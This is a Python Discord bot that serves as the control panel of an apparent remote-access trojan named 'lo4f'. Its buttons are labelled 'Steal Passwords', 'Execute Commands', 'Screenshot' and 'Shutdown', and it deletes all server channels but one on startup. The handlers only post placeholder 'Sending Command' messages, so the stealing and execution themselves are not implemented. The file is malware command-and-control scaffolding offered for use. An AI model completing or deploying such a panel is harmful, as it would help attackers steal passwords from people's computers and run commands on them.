import discord
from discord.ext import commands
from discord.ui import Button, View

MAINCHANNEL = 123456 #change this with your main channel id in your server
DISCORDTOKEN = "123456" #change this with your discord token

intents = discord.Intents.default()
intents.message_content = True  

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.command()
async def menu(ctx):
    await ctx.send("Control Panel:", view=HelloWorldView(timeout=None))

@bot.command()
async def clear(ctx):
    for channel in ctx.guild.channels:
        if channel.id != MAINCHANNEL:
            await channel.delete()

class HelloWorldView(View):
    def __init__(self, timeout=None):
        super().__init__(timeout=timeout)

    @discord.ui.button(label="Send Popup", style=discord.ButtonStyle.green)
    async def button_callback_1(self, interaction, button):
        await interaction.response.send_message("Sending Command #1 - Popup", delete_after=1)

    @discord.ui.button(label="Steal Passwords", style=discord.ButtonStyle.red)
    async def button_callback_2(self, interaction, button):
        await interaction.response.send_message("Sending Command #2 - Password Stealer", delete_after=1)

    @discord.ui.button(label="Execute Commands", style=discord.ButtonStyle.red)
    async def button_callback_4(self, interaction, button):
        await interaction.response.send_message("Sending Command #4 - Execute Commands", delete_after=1)

    @discord.ui.button(label="Screenshot", style=discord.ButtonStyle.blurple)
    async def button_callback_3(self, interaction, button):
        await interaction.response.send_message("Sending Command #3 - Screenshot", delete_after=1)

    @discord.ui.button(label="Shutdown", style=discord.ButtonStyle.grey)
    async def button_callback_5(self, interaction, button):
        await interaction.response.send_message("Sending Command #5 - Shutdown", delete_after=1)

@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user}')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="your commands :3"))
    channel = bot.get_channel(1335106197686194189)
    if channel:
        class StartView(View):
            def __init__(self, timeout=None):
                super().__init__(timeout=timeout)

            @discord.ui.button(label="Start Service / Refresh Users", style=discord.ButtonStyle.green)
            async def start_button(self, interaction, button):
                await interaction.response.send_message("Starting Service...", delete_after=1)

            @discord.ui.button(label="Delete Channels", style=discord.ButtonStyle.red)
            async def delete_button(self, interaction, button):
                for channel in interaction.guild.channels:
                    if channel.id != MAINCHANNEL:
                        await channel.delete()
                await interaction.response.send_message("Channels deleted!", delete_after=1)

        await channel.purge()
        channels_to_delete = [ch for ch in channel.guild.channels if ch.id != 1335106197686194189]
        for ch in channels_to_delete:
            await ch.delete()

        view = StartView(timeout=None)
        await channel.send("Welcome to lo4f!", view=view)

@bot.event
async def on_guild_channel_create(channel):
    if channel.type == discord.ChannelType.text:
        view = HelloWorldView(timeout=None)
        await channel.send("Control Panel:", view=view)

bot.run(DISCORDTOKEN)
